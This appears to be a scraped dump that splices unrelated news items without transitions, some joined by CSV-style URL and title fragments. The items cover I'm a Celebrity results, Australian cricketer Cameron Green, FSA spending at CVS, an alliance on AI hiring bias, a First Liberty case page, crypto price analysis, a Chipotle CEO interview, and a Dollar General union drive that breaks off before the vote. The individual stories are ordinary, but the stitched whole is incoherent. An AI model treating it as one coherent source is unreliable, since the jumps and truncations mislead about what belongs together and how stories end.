Danny was up first playing for starters and he had the famous helmet trial where he had castle critters added every two minutes.

To distract himself he had a little singsong with Dec and at the end when he won all the starters he revealed that he was pretty proud of himself.

Up next was Simon who was playing for the mains and he had a grim eating trial to get through where he chowed down on pig's eye goat tongue fermented castle gruel and cow's vagina.

Frankie took on the Tomb of Doom to win desserts for all of them where she was placed in a dark tomb with snakes and had every two minutes she spent inside earned her another star.

Afterwards Frankie couldn't believe she'd done the task.

""I feel I can go home and I've ticked all the boxes"" she told the hosts.

That's it over for another year. Will next year see the return of Gwrych Castle for the third year running or will the show be back in its home in the Australian jungle? We'll have to wait and see.

(Picture: ITV)

Last year’s series of I’m a Celebrity Get Me Out Of Here was a bit different than usual – due to the Covid pandemic the 2020 series was the first time the show moved from the Australian jungle to a Welsh castle.

This year ITV kept the action in the castle due to ongoing Australia travel restrictions – with Emmerdale’s Danny Miller being crowned King Of The Castle in the final ahead of fellow campers Simon Gregson and Frankie Bridge.

Other contestants this year who braved the brisk Wales weather (on top of the usual Bushtucker trials) included Olympian Matty Lee football legend David Ginola Strictly’s Arlene Phillips and musician Naughty Boy.

But who has Danny succeeded? Let’s remind ourselves of who won I’m A Celebrity back in 2020…

Who won I’m a Celebrity Get Me Out Of Here 2020?

A cast of 12 British stars travelled to freezing Gwrych Castle in Wales with only one emerging as Queen of the Castle.

It was… author and podcaster Giovanna Fletcher!

Mum blogger Giovanna – who shares sons Buzz Buddy and Max with McFly singer Tom Fletcher – won over the public’s affection for her warm and caring nature.

She was often a shoulder to cry on or a listening ear for the other celebrities throughout the show.

The finale episode saw Giovanna win the biggest share of a whopping 12 million votes – with some of those going to runner-up Jordan North a BBC1 radio host.

Vernon Kay presenter of All Star Family Fortunes and other ITV game/reality shows came in a respectable third place.

Meanwhile some of the longest-surviving campmates were EastEnders icon Shane Ritchie Olympic champion Sir Mo Farah and ex-Strictly dancer AJ Pritchard.

EastEnders actor Jessica Plummer opera star Russell Watson and news broadcaster Victoria Derbyshire managed to outstay co-stars Beverley Callard of Coronation Street fame theatre performer Ruthie Henshall and Paralympian Hollie Arnold – who went home first.

Sorry this video isn't available any more.

Unfortunately Giovanna didn’t receive the title ‘Queen of the Jungle’ – due to the obvious lack of an Australian jungle.

But she was crowned the first-ever ‘Queen of the Castle’ (with a crown and sceptre) in the last moments of the 2020 series.

The news came in on Saturday night as viewers voted for who they wanted to keep in as the four semi-finalists remained on the show.

Following the double elimination of Olympian Matty Lee and EastEnders ' Adam Woodyatt on Friday night it was the four remaining contestants' chance to take on the famous Celebrity Cyclone.

The segment was as classic as ever as the final four were pelted with all sorts and braving strong winds and plenty of water.

But at the end of the episode Ant McPartlin and Dec Donnelly were back to confirm who the latest evictee was just a day before the final.

Arriving in camp they delivered the news as the other shocked contestants raced to say their goodbyes.

Danny Frankie and Simon were evidently emotional to lose David as it also dawned on them they were the last three standing.

On his exit David said it was ""amazing"" to see footage from his time in the castle adding he and his campmates ""loved each other"".

He said it was a ""victory"" and a ""win"" to have enjoyed the experience he had suggesting he had been ""adopted"" by the UK public.

Referencing times he called out campmates including Naughty Boy and Louise Minchin he said it was ""fun"" but ""difficult"".

It's now up to the public to vote yet again as they must decide who wins the crown out of Frankie Danny and Simon.

Of course the cast may not all return to the studio at the famous castle to watch the winner be crowned on Sunday night.

Due to coronavirus restrictions and the fact all those who have left have now possibly broken the Covid bubble they formed ahead of the launch it's not yet clear if any of the line-up will be back.

Meanwhile it has been confirmed last year's winner Giovanna Fletcher will not follow tradition in handing over the crown due to the restrictions on set.

Green who made his test debut against India in Adelaide last December picked up his first wicket by removing Ollie Pope on a disappointing opening day for England before dismissing the dangerous Joe Root for 89 in the second innings.

“It’s huge for us not only having an all-rounder who bowls a bit but he’s a genuine fourth quick” said Cummins adding that the team was witnessing Green’s full potential after repeated stress fractures over the last four years.”

Last summer was tough it was literally straight after stress fractures so not only did we not want to put too many overs into him but little things like preparing for games and getting overs he didn’t have a lot of bowling behind him.” This year he’s had a real pre-season bowled a bit more in Shield cricket so he’s back to what he was probably bowling a couple of years ago.

“He’s a huge asset bowls 140 kph (87 mph) can swing the ball and I really wanted to get him into the game.”Lyon who captured his 400th test wicket during the game said Green’s display was remarkable.”

Just to be fielding square of the wicket — I’m used to seeing Josh (Hazlewood) Pat and Mitchell Starc hit the wicket and the pace and bounce that they get” Lyon said.

“I was blown away with Green’s rhythm and the belief that he’s come in with (and the way he) whacked the pitch to get something out of it.”I’m proper excited about his skill set.

His belief will keep growing day by day training session by training session and test by test … he’s going to be an unbelievable asset for Australian cricket for a long period of time hopefully.”

While there are probably a variety of online deals you have in mind to shop here’s a friendly reminder that you’ll also want to spend your FSA funds before they run out. An FSA (or flexible spending account) is an employer-sponsored healthcare benefit that allows employees to set aside a certain amount of money annually to cover the cost of qualified medical expenses. Basically it’s like a savings account but used for qualified health-related costs. An HSA (health savings account) is similar but your funds don’t expire. No matter which account you have you can use them for some pretty surprising items—including some of your favorite beauty items (more on that below). FYI: FSA funds are subject to a use-it-or-lose-it rule which means that any balance by the end of each plan year is forfeited to the account holder’s employer.

So now’s the time to use up those precious funds before it’s too late—you’ve got less than a month to go until the new year. If you’re not sure where to go to spend these funds CVS has everything you need from beauty products and medicine to health essentials and vitamins. You’ll want to act fast because CVS is having a can’t-miss FSA event from December 12th to December 25th and with so many items to choose from it’s easy to see how picking products can be a challenge. Luckily we’ve put together a list of 10 FSA- and HSA-eligible items from CVS—including some tried-and-true beauty items we had no idea you could get with your FSA or HSA account—that we think can help you take full advantage of your benefits.

Bias in Hiring Practices,"Some of the largest corporations in the country are joining forces to combat artificial intelligence bias in hiring practices the New York Times reports.

The Data & Trust Alliance announced on Wednesday that it has the endorsement of major corporations across a variety of industries such as CVS Health Deloitte General Motors Humana IBM Mastercard Meta (Facebook’s parent company) Nike and Walmart.

Instead of lobbying an organization or a think tank the group has developed a 55-question evaluation and a scoring system that covers 13 topics specifically designed for artificial intelligence software.

“This is not just adopting principles but actually implementing something concrete” said Kenneth Chenault co-chairman of the group and a former chief executive of American Express

According to the research A.I. programs can inadvertently produce biased results.

Simply put if the data used to develop an algorithm is based on information solely about white men most likely the results will be biased against people of color women or the LGBTQ+ community. Or if the data used to predict success at a company is based on past results alone the data produced will be an algorithmically reinforced determination of previous bias. What may seem like sets of neutral data when combined with others can produce results that discriminate by gender race or age.

The Data & Trust Alliance is venturing to expose the potential danger of powerful algorithms being used to make decisions in the workforce early on as opposed to reacting after the damage is done.

“We’ve got to move past the era of ‘move fast and break things and figure it out later’” Chenault said.

Nuala O’Connor senior vice president for digital citizenship at Walmart additionally argues that algorithms can offer limited perspectives and fail to convey the entire picture.

""Every algorithm has human values embedded in it and this gives us another lens to look at that” O'Connor said. “This is practical and operational.”

Ashley Casovan executive director of the Responsible AI Institute a nonprofit organization developing a certification system for A.I. products said the focused approach and commitments of major companies are signs of encouragement. “But having the companies do it on their own is problematic” Casovan said. “We think this ultimately needs to be done by an independent authority.”

Over the past year the evaluation program has been improved and the goal is to not only partner with prominent human resource software creators but newer companies in the rapidly-growing field of “work tech.”

""The promise of this new era of data and A.I. is going to be lost if we don’t do this responsibly” added Chenault.",https://news.google.com/articles/CBMiKGh0dHBzOi8vZmlyc3RsaWJlcnR5Lm9yZy9mZWF0dXJlZC1jYXNlcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Key Cases - First Liberty,"Sweet Cakes by Melissa

Can the government force Americans to choose between their faith and their livelihood?

Can the government force you to act against your conscience—to say or do something that directly conflicts with your religious beliefs? These are the questions at the heart of our case for Melissa Klein award-winning cake artist and former owner of SweetCakes by Melissa. The state of Oregon imposed a $135000 penalty and told her she needed “rehabilitation” for simply running her family business according to her religious beliefs. Now almost 10 years later—after being forced to close her business and enduring violent death threats—she is still searching for justice still waiting for the courts to recognize her constitutional right to stand by her faith as she runs her business."

Bitcoin BTC to USD rose by 1.31% in the week ending 12th December. Partially reversing a 13.70% slide from the week prior Bitcoin ended the week at $50123.

A mixed start to the week saw Bitcoin rise to Tuesday intraweek high $51970 before hitting reverse. Falling well short of the first major resistance level at $58554 Bitcoin tumbled to a Saturday intraweek low $46872.

Steering clear of the first major support level at $41014 however Bitcoin found weekend support to wrap up the week at $50100 levels.

4-days in the green that included a 4.70% rally on Saturday delivered the upside.

At the time of writing Bitcoin was down by 1.02% to $48968. A mixed start to the week saw Bitcoin rise to an early Monday morning high $50234 before falling to a low $48488.

Bitcoin left the major support and resistance levels untested early on.

For the week ahead

Bitcoin would need to move back through the $49655 pivot to bring the first major resistance level at $52431 into play. Support from the broader market would be needed for Bitcoin to break out from last week’s high $51970. Barring an extended crypto rally the first major resistance level and the 23.6% FIB of $53628 would likely cap any upside.

In the event of a breakout Bitcoin could test resistance at $55000 before any pullback. The second major resistance level sits at $54753.

Failure to back move through the $49655 pivot would bring the first major support level at $47340 into play. Barring another extended sell-off Bitcoin should avoid the second major support level at $44557 and the 38.2% FIB of $44144.

Ethereum (ETH)

Ethereum fell by 1.67% in the week ending 12th December. Following a 2.21% decline from the previous week Ethereum ended the week at $4203.

After a choppy start to the week Ethereum rose to a Thursday intraweek high $4491 before hitting reverse. Falling short of the first major resistance level at $4800 Ethereum slid to a Saturday intraweek low $3835.

Steering clear of the first major support level at $3590 however Ethereum broke back through to $4100 levels to reduce the deficit.

3-days in the red that included a 7.53% sell-off on Thursday delivered the downside in the week.

At the time of writing Ethereum was down by 3.76% to $3978. A mixed start to the week saw Ethereum rise to an early Monday morning high $4146 before falling to a low $3954.

Ethereum left the major support and resistance levels untested early on.

For the week ahead

Ethereum would need to move through the $4153 pivot level to bring the first major resistance level at $4471 into play.

Support from the broader market would be needed however for Ethereum to break back through to $4400 levels.

Barring an extended crypto rally the first major resistance level and last week’s high $4491 would likely cap any upside.

In the event of another extended breakout Ethereum could test resistance at $5000 before any pullback. The second major resistance level sits at $4809. Ethereum would need plenty of support however to breakout from its ATH $4868.

Failure to move through the $4153 pivot would bring the first major support level at $3815 and the 23.6% FIB of $3738 into play. Barring an extended sell-off however Ethereum should steer clear of the second major support level at $3497.

As chief executive of Chipotle Mexican Grill Brian Niccol likes to schedule time on his packed calendar to visit the company’s restaurants and see people enjoying the food.

“I see some of these burritos and bowls that people build and I’m like that is enormous” he laughs.

Niccol has led Chipotle since March of 2018 and in that time the “fast-casual” restaurant chain has grown from 2441 locations to nearly 3000. The company’s stock has soared 443% compared with the S&P 500’s 73% rise over the same period. And between 2018 and 2020 Chipotle has more than doubled its annual net income to $355.8 million. Oddly enough Chipotle isn’t Niccol’s first stint at a Mexican themed restaurant. Prior to joining Chipotle he was Taco Bell’s CEO after serving in a number of executive roles there.

Despite Chipotle’s upward trajectory under his leadership Niccol’s tenure as chief executive hasn’t been without its challenges especially during 2021. Like many restaurant chains Chipotle has found it more difficult to hire and retain workers in a competitive labor market where employees are gaining the upper hand. In October Chipotle employees in New York staged a strike to speak out against working conditions a protest that coincided with organized walkouts this fall at companies including American Airlines General Electric John Deere Kellogg’s McDonald’s and Netflix.

Niccol acknowledged in an October earnings call with investors that many Chipotle restaurants have been “missing sales” because they’re not fully staffed. The company raised wages last summer enhanced benefits and has said it would sharpen its focus on developing talent and helping workers learn skills they need to gain job promotions. At the same time Chipotle has increased prices across its menu to help manage the higher costs of labor and food supplies.

Niccol spoke to TIME in late November about hiring and retention sustainability and one coming addition to Chipotle’s menu that really excites him.

(This interview has been condensed and edited for clarity.)

The pandemic has been a brutal time for the restaurant business and Chipotle has had to confront a lot of major issues that we’ve seen elsewhere in the economy like hiring challenges rising prices and workers quitting and striking over higher wages more flexible hours and better treatment. Not to mention customers who are sometimes on-edge and rude. How does all this look from where you sit? And how are you handling it?

Yeah there’s a lot going on right now. And there’s probably more stress or anxiety out in the marketplace than you’ve seen in the past which compounds all those things you just talked about. So the approach that we’ve taken is a simple one: We want to make decisions for our people and for our company that are consistent with our purpose and values. I’ve found that’s worked in good times and tough times. And we’re willing to learn and grow and we’ll take the feedback accordingly. From the pandemic to the tight labor market to the challenging supply chain situation we’re in we’ve just really relied on clearly communicating the decisions and making sure that those decisions were made consistent with our culture which is really grounded in values and purpose.

What’s the shorthand version of that? What are Chipotle’s values and purpose?

Our purpose is stated as cultivating a better world. And then we do that through our ability to source and provide culinary driven food with integrity. And what’s behind that is the idea of doing the right thing for our people. We’re doing the right thing for our customers and we’re doing the right thing for the planet. That’s shorthand but when we communicate it consistently that way it’s a simple thing. So if you just take that approach and people see that hey look your decision was grounded in our company culture and purpose. I think they’re comfortable with us sometimes saying look we got it 80% right. But there’s 20% we have to tweak. And I’m very transparent with that. And one thing the pandemic’s taught me is… I thought we were communicating a lot before the pandemic. Now we’re really I think communicating at a much better clip all the way down to every single restaurant.

How are you communicating differently now?

It’s the frequency of it. The good news is we’ve got all this technology that allows us to bring together all of our restaurant managers and above on a video conference or a phone conference. And we allow for Q&A in all those sessions. We were doing that probably once or twice a year. Now we’re doing it monthly. When the COVID pandemic hit [our core team was] meeting twice a day every day and then we were communicating out the next morning. So it was like we’d make decisions in the morning. We’d evaluate those decisions by the end of the day if we needed a course correct or new information came in we’d make new decisions and then communicate in the morning.

How about now? Are you still meeting that often?

Now things aren’t changing that fast anymore. But we still have these flash areas of supply chain staffing and then [new] regulations around COVID as well as COVID spikes or pullbacks have caused different operating rules that we continue to have to navigate.

It’s a tough job market for employers. How do you retain employees?

We’re always trying to figure out how we can ensure that we’re developing our people correctly and rewarding them correctly both in compensation and additional benefits. One of the biggest things that retains people at our company is the growth of our company. You can join our organization as a crew member and in short order—I think it’s in short order anyway two to three years—you find yourself as a restaurant manager. In five to seven years a multi-unit leader meaning you’re overseeing six to eight restaurants. And that’s a big job if you want to stop and think about it. It’s like each of our restaurants are doing two and a half million dollars [in average annual sales]. You get eight of those it’s a $15 $20 million business. There’s 30 to 35 employees per restaurant. So you’ve got 250 employees. That’s significant.

One of our biggest retention tools is the fact that we’re building over 200 restaurants a year. Opportunity is a very attractive retention tool. The other piece too is we provide things like debt-free degrees mental health benefits English as a second language not just for you but your extended family. The bigger we get the more good we can do. And most recently we’ve been really public about how we’re helping the local farm the small family farm. That gets people even more committed. And it makes them proud of the ingredients that we serve. There’s also the emissions-based targets that we just put out there to reduce the scope one two and three greenhouse gas emissions. I mean that matters to young people. And a lot of our employees are young folks. They’re in their 20s.

How do you make sure you’re holding on to people who might be potential store managers and more—because it’s tough for all businesses right now?

Yeah it is tough. We do this exercise where every quarter we check in from the folks that work directly with me all the way down to the restaurant which we call a four-by-four. It’s really just asking: “What are the four things you’re focused on for the business?” “What are the four things we’re focused on in developing you?” It’s a powerful tool because you take accountability then in saying how you want to grow. Your manager then is responsible to help you grow and then you’re also crystal clear on your accountabilities on performance because I think those things have to go hand in hand. I have found this over and over again. People like to be successful. They like to win. They like to know that they’ve accomplished the objective. I’ve found people really are energized when they know what results they’re accountable for. They can see the impact that they make on those results. And then they get to discuss how they’re doing against it. It’s a powerful exercise.

Clearly it’s important that Chipotle remains a fast growing company. But you have a lot of competitors that are adding more to their menus and adding more to the dining experience. How are you dealing with competitive pressures?

Look if we give a great experience for employees and we give a great experience for our customers centered on what we do uniquely which is food with integrity great culinary high customization we’ll keep winning. There aren’t many places where you can go for less than $10 and get the food that we provide. Meaning it’s clean in our opinion raised the right way and then prepared with classic culinary techniques so that you get a delicious experience. And the speed at which we do it the customization at which we do it and then the price at which we provide it that’s our offense and that’s our best defense. That’s what we stay after. It’s like I want every person when they have their experience at Chipotle to be like “God the guac is just so good.”

You mentioned earlier that a lot of your employees are young people. Other CEOs have recently noted that young workers almost require their employers to take a stance and be out front on social and political issues. Are you feeling that kind of pressure from your employees? And if so what issues has Chipotle chosen to take a stand on?

Yeah. The expectations I’ve heard from our folks—and I think it’s the right expectation—is they expect us to have a point of view on food. They expect us to have a point of view on people development or the inclusive aspect of everybody having a chance to succeed at our company. What I have found that resonates really well with our employees are the things that we can be truly authentic with and actually make an impact on. And so that’s where we spend our time. I think we’re a leader on the climate discussion. I think we’re a leader on the idea of doing the right thing for farming around regenerative farming. I think we’re a leader on doing the right thing for the food supply chain. I think we’re a leader on frankly inclusion and the diverse nature of our workforce.

How so?

I say this to everybody: There aren’t many companies where you can show up and potentially have just a high school degree or still in process of a high school degree and we will support you to get the next capability that you need whether that is some vocation community college traditional college whatever learning you want to enable you to move further along in our company. The good news is if you are passionate about our purpose and you love the idea of the restaurant business and of the culinary experiences that come with it we can put you on a path to hopefully build your capabilities to match your ambition and that’s where we spend our time.

Can you talk a little bit more about the environmental and farming work that you’re doing around sustainability and emissions reduction?

So on the farming side we buy I want to say 20 or 30 million pounds of local organic produce. The reason why that’s important? Our bonuses are tied to us growing that every year. A percentage of our bonus is tied to us making progress on this organic local food chain. And I think it’s critical that we do it.

One of the biggest things that we do for the small farmer is we give them multi-year contracts so they know that if they create the field to be organic for use growing let’s say cilantro they know they have got a big buyer for years to come. They don’t want to turn a field to be organic cilantro only to find out now what do I do with this organic cilantro? It’s a big risk for them. So these multi-year contracts we do the same thing with animals as we do on produce. If you raise the animal correctly or consistent with what we believe are the humane practices feed them correctly we will give you a long term contract on the other side. That’s really powerful for a young farmer—meaning they’re new to the industry. It’s also powerful for a farm that’s thinking about generationally transferring the farm.

We also support the national young farmers coalition. I think we’ve committed over $5 million to them recently. We do grants. If somebody wants to start a hog farm and they need a sow and they may not have the ability to get the money to get the sow that’s where we can support them accordingly and get them started. We support some of the academic programs that a lot of these folks take in order to become successful farmers. And I can’t remember there’s a bunch of degrees that we do as debt-free that are in the agriculture space so we really try. The goal here is if we say it’s important then we need to demonstrate that it’s important.

Chipotle recently pledged to cut carbon emissions by 50% by 2030. And that’s not only in the restaurants but also across the supply chain. How will that work?

This is obviously like working all the way back with ranchers on whether there’s a better way to raise cattle. Is there a better way to harvest the produce and transport the produce? Can we put distribution centers closer to farms? There are a lot of things we can be doing through the supply chain. Also are there different ways to provide energy in our restaurants? And one of things I love about our company is we’ve always been experimenting. We had a restaurant where we literally stuck a windmill on the roof to see if we could use wind power to supply the restaurant. It didn’t work.

But somebody was able to try it?

Yeah to see what we can do. It’s easy to say we’re going to experiment learn and frankly be better. I found if you don’t make a target you don’t achieve the target. So that’s why we put it out there. We can’t just say we’re going to be better. We got to have a target for how much better we’re going to be.

How are you making sure the entire company is working toward these targets?

The climate-based targets are part of the bonus structure as well. Just like the food I was talking about. And then the third thing that’s part of it is equity and pay as well as ensuring that we’ve got an inclusive yield meaning everybody is growing in our organization. So you go from manager to field leader field leader to TD. We want it to be representative of the diversity we have as we move up to the organization. So all three of those. So you got people climate and food are tied to our bonus.

How are you setting targets related to diversity?

We operate everywhere around the country and the diversity of our work force represents usually the region that we’re in. And so we want to make sure the diversity of that workforce grows with us. So if you add field leaders team directors executive team directors we want that to continue to be representative of the part of the region that we’re operating in. So we monitor that as well.

Lately many American workers have been asking for—and getting—raises. What’s been Chipotle’s experience with that over the last year or so?

We’ve always been a leader in compensation especially at the entry level spot so we took a look back in I guess it was like March April and the [labor] market was really tight. We weren’t getting the hires that we wanted to get. And so we said benefits are great the growth opportunity is great. But you know what? They’ve got to have the right wage to get them started. And so we took up our average hourly wage to $15 across the company and for the starting job. It’s something frankly that we used to look at on a six month cycle and now we’re looking at it on a week to week basis market by market because in this inflationary environment you’ve got to recognize what you’re dealing with. And so luckily we have the pricing power to complement our need if we need to pivot on other cost elements. Whether that’s wages or buying produce.

Are there places where you’ve had to look at bringing the starting wages up beyond $15 per hour?

Yeah we already do that. There are parts of the country where the starting wages are $18 $19 an hour.

Are there practices that you’ve put in place during the pandemic that you think you’ll keep around because it just makes more sense and works really well?

Yeah. I would say the thing that we’ll probably keep in place is the monthly communication. I hope the market’ll be a little bit more stable where we’re not having to look at so many elements from wages to the cost of chicken on a two to four week basis. But I definitely think one thing I’ve learned is that as a company that’s growing as fast as we are we can’t communicate enough. And we won’t be doing obviously the twice a day conversations but this monthly cadence of connecting with all of our restaurant general managers is something that we’re going to stay with. It just works. It’s not working because we’re in a pandemic it works because it’s a good practice. It’s a really good practice.

What are those meetings like? Like you’re all on one big Zoom and people are chiming in asking questions?

The way I think about it is we set aside an hour. We usually have 20 to 35 minutes where we’re speaking. And then we leave the rest of the time for Q&A. Some of it is live and others are… we allow people sending questions ahead of time too. And I’ll tell you I think the last 20 or 30 minutes where you have the dialogue on the questions at hand is the most valuable piece of this.

It seems like you can really get a feel for what’s happening on a local level that way.

Totally. I’d like to try and get out every week and get to a certain part of the country to go visit a couple restaurants. But it’s just that. It’s a couple restaurants and we have 3000 restaurants versus I have all these folks on the phone or on [video-conference]. And what you find out is one person says it and like a bunch of people in the chat say yeah me too. Me too. And then you’re like OK we do have something here to address. And that dialogue is invaluable.

We’re almost at the end of 2021 and I’m wondering if you have any predictions for the coming year. What are your thoughts about 2022 right now?

I believe there’s going to be opportunities that we’re not aware of yet. I think there’s going to be more tailwind than headwind in ’22. And I believe our company’s positioned really well to take advantage of it for the benefit of our employees and our customers. There’s a lot of challenges that we’re going to be dealing with but I’m optimistic we’re going to get through it and I think we’ve demonstrated just how resilient our company is and just how resilient our people are.

On the topic of food do you have anything new coming to Chipotle’s menu in 2022 that we should be on the lookout for?

I’ll tell you we’ve got this plant-based chorizo that we just finished testing. We haven’t nailed down when we’ll launch it nationally but it performed well in tests. If you’re a queso con carne person put some of this plant-based chorizo into that queso. Oh my gosh man.",https://news.google.com/articles/CBMiZmh0dHBzOi8vd3d3Lndhc2hpbmd0b25wb3N0LmNvbS9uYXRpb24vaW50ZXJhY3RpdmUvMjAyMS93b3JrZXItcmV2b2x0LWNvbWVzLWRvbGxhci1nZW5lcmFsLWNvbm5lY3RpY3V0L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,What happened when six workers at a Dollar General in Winsted Conn. tried to form a union,"A call to a union triggers one of the most lopsided battles of the ongoing low-wage-worker revolt

The worker revolt comes to a Dollar General in Connecticut A call to a union triggers one of the most lopsided battles of the ongoing low-wage-worker revolt

WINSTED Conn. — The afternoon shift workers at Dollar General No. 18060 had listened with growing panic as an executive accused their store manager of stealing. They could hear the yelling and threats in the back office a scene that had shaken all of them — especially Shellie Parsons.

In a life marked by poverty addiction and physical abuse Parsons 37 had come to see her store — a beige prefabricated building on the outskirts of town — as her haven a $15.75-an-hour pathway to a better life. She was desperately afraid of losing it.

And so after a brief discussion with a few trusted co-workers she headed to a nearby Stop & Shop grocery store where years earlier she recalled seeing a picket line walked back to the deli counter and asked one of the butchers whom she had never met whether he had a phone number for someone at their union. She dialed from the parking lot.

“Why does it got to be me?” she recalled thinking as the phone rang. She feared that talking to a union organizer could get her fired even as she worried that doing nothing would leave her and her colleagues vulnerable to the whims of upper management.

All over the country workers who had labored through a global pandemic for low pay and meager benefits were concluding that they deserved better from their bosses. Wages were rising and a wave of strikes was sweeping across the country hitting iconic American brands such as Kellogg’s and John Deere. And now Parsons’s phone call was setting off one of the most lopsided battles of the ongoing low-wage-worker revolt.

On one side: six Dollar General employees most of whom were making the minimum wage or just slightly above it. The group included a community college student a struggling musician who had recently moved back home and two single moms one of whom was Parsons. On the other: a company with yearly revenue approaching $34 billion more than 157000 employees and 17683 stores not one of which was unionized.

Four days after her Sept. 17 phone call Parsons and a few of her co-workers met with the union organizer. To prepare she had written out what they all hoped to gain in a letter that went through three drafts and that Parsons had finished in the front seat of her car.

“We all want to make sure we can make a living and not worry we will get fired for false accusations or made up things” she wrote. “Take our words serious don’t just brush them off. … We are your employees not strangers.”

The workers wanted more job security. They wanted a process to ensure that their complaints weren’t ignored. They wanted to know that their labor was valued and that they were respected.

Parsons and three of her co-workers signed it and handed it over to the organizer with Local 371 of the United Food and Commercial Workers union. Then they signed union cards authorizing an election scheduled for Oct. 22 — exactly one month away. To prevail all the signees — or four of the store’s six workers — would have to vote for the union.

Parsons and her fellow workers weren’t just trying to unionize; they were challenging a core aspect of the business model that has fueled Dollar General’s boom over the past decade.

“We believe our union free status is one reason we continue to grow and provide employment while many unionized companies have declined” the company wrote in third paragraph of its 2015 employee handbook.

Dollar General had carved out a niche that allowed it to thrive in communities where people were struggling to put food on the table and pay their bills and there were more and more of these places popping up throughout the country ever year.

To serve these communities Dollar General has concentrated on needs not wants. Each store typically consists of about 7400 square feet of cramped dimly lit aisles focusing on staples such as milk eggs and diapers as well as products such as pain relievers frying pans and motor oil. They are stocked in small sizes instead of bulk to keep prices low and profit margins high. Staffing is just as spare — typically six employees and a manager who often works six or seven days a week.

The approach had proved so successful that by 2020 there were more dollar stores — a category that includes Dollar Tree and Family Dollar — in the United States than all the Walmart Starbucks and McDonald’s locations combined. Of these Dollar General was the biggest of them all.

Before the vote at Parsons’s store the last serious effort to unionize a Dollar General came in December 2017 when workers in Auxvasse Mo. sought to become the first store in company history to join the UFCW.

Dollar General moved swiftly to quell the Auxvasse uprising. In the weeks before the vote company executives flew into town on a private jet and the vice president for human resources embedded herself in the store working alongside employees cleaning windows stocking shelves and making the case for rejecting the union according to workers and court documents.

The employees voted 4 to 2 to organize an outcome Dollar General spent the next 28 months fighting in the courts on the grounds that the vote was flawed. In the middle of its legal battle the company fired the employee who initially called the union for using a curse word in a private meeting with his district manager.

As part of a settlement approved by the National Labor Relations Board Dollar General agreed to compensate the fired worker. The company was also required to post a notice in the Auxvasse store’s break room acknowledging the monetary settlement and its workers’ right to organize.

“WE WILL NOT fire you because of your union membership or support” the notice read.

Instead the company took a more extreme step: It closed the store early last year only weeks after the U.S. Court of Appeals for the 8th Circuit ordered Dollar General to recognize and bargain with the union. Alan Bloom 70 a cashier said some of the store’s employees including its manager negotiated transfers. Bloom decided to retire.

He had voted for the union but now that the store was closing he wished he hadn’t. “For a while it felt revolutionary like we were going to change things” he said. “But that didn’t happen. The store just closed.”

Dollar General was the town’s only national chain and the only place — besides a gas station convenience store — that sold frozen food snacks and canned goods. “It’s left a hole in our town” said Ashley Steinbeck Auxvasse’s mayor. “It was such a convenience for everyone especially for elderly folks who can’t get around really well.”

In a statement Dollar General said the decision to close the store just weeks after it was ordered to negotiate with the union was based on an “assessment of the store’s future profitability.”

David Cook the president of UFCW Local 655 in Missouri suggested a different motive. “It’s a control issue” he said. “I don’t think anybody out there recognizes the value an employer like Dollar General puts on having an at-will workforce. ‘At will’ means I can fire you for any reason I want as long as it’s not color religion or ethnicity. It’s that ultimate power of intimidation. … You can’t put a value on that if you’re an employer — especially one the size of Dollar General.”

Parsons didn’t know any of this history when she placed her call to the union in September. She was just worried about losing a job that offered a sense of stability and predictability in a life that had often felt on the brink of collapse.

She had spent her teenage years in foster care battled a heroin addiction and served a year in prison but by the time she started at Dollar General in 2019 she was beginning to pull her life together. Other than a brief relapse and terrifying overdose in early 2019 she had been drug-free for most of the past 12 years. She was trying to end an abusive relationship and her boss and colleagues had offered support noticing the bruises on her body and encouraging her to leave her partner.

Aside from Bella her 8-year-old daughter Parsons’s store had become the most important thing in her life a place where she felt successful earning pay raises and a promotion to assistant manager.

“I don’t have any family. I have no one” she said. “And when I started working for Dollar General I got away from my lifelong abuser and I survived and I got a family and a future.”

Parsons didn’t expect better pay or benefits from unionizing. She just wanted to hold on to what she had.

In the days after she and her co-workers signed union cards the company hired five anti-union consultants each of whom was paid $2700 a day according to documents filed with the Labor Department. It dispatched three out-of-state executives to the store who shadowed the employees for the month working alongside them. Sometimes the executives talked baseball hunting or music with the store employees.

Other times they warned them about the union which they said would make them pay costly dues and ruin their relationship with their store manager whom they liked and admired.

Mostly the executives seemed to be spying on them the employees said. About a week after they arrived at the store Jake Serafini 31 was restocking an aisle with one of his co-workers he recalled. “I would never be able to do this job for $7.25 an hour” he said thinking of the minimum wage in North Carolina where he had lived before returning home to Winsted.

Seconds later Serafini said one of the corporate executives emerged from a nearby aisle. “The minimum wage in Connecticut is $13 an hour” he said.

Serafini a part-time musician agreed but noted that it was still a “little low” given the state’s high cost of living. He didn’t think much about the incident until the same executive spotted him a few days later stacking pizzas in a freezer that was badly overstocked.

“It looks there are sparks coming out of your ears” the executive said.

“Look at this f---ing bullsh--” Serafini replied pointing to the mess. The executive offered to show him how to fix the oversupply problem and Serafini said he apologized for cursing.

After his shift Serafini said two of his co-workers approached as he was walking to his car and told him they had been ordered to sign statements saying they had heard him curse. Serafini’s store manager called that evening and fired him. In his five months with the company Serafini hadn’t missed a shift and had no disciplinary write-ups.

“My heart is breaking” Serafini recalled his boss saying. “I’m doing everything I can on my end. We’re going to get you back.”

The dismissal shook some of Serafini’s co-workers who were convinced that he was fired because he was pro-union or possibly because the Dollar General executives believed he had instigated the union drive. It incensed Parsons who felt responsible. Serafini had been filling in for her on the day he was fired.

At the union’s request Parsons did interviews with CNN HuffPost and the Hartford Courant. She recorded a video for More Perfect Union a labor advocacy group in which she talked about Serafini’s dismissal. “The only people that can save us is a union” she said on the video.

Six days before the vote Parsons believed that three out of six employees including Serafini who despite his dismissal was allowed to vote were pro-union. One was wavering a worker named Jen whose vote was crucial. The woman did not respond to requests for comment from The Washington Post for this story. Parsons said that a Dollar General executive had warned Jen about the closing of the Auxvasse store and suggested that the same thing could happen in Connecticut.

“I need you to call Jen and talk to her” Parsons texted the UFCW organizer Jessica Petronella. “They are getting to her. We have to act Very Quickly or we are going to lose her.”

Three days before the vote Parsons Jen and Petronella met in a supermarket parking lot a short drive down the highway from the Dollar General. It was a spot where they hoped that the company’s executives and consultants who now outnumbered the workers wouldn’t see them.

Petronella said she asked Jen to draft a statement describing what she considered to be the company’s threat to close the store along with an account of Serafini’s firing. Jen wrote that the executive told her to “look into the dollar general store that had been closed” and shared that Serafini’s firing may have been related to corporate’s belief that he had been the first to call the union.

Dollar General in response to questions from The Post said that no threats were made to close the Connecticut store and denied that Serafini was “treated unlawfully.”

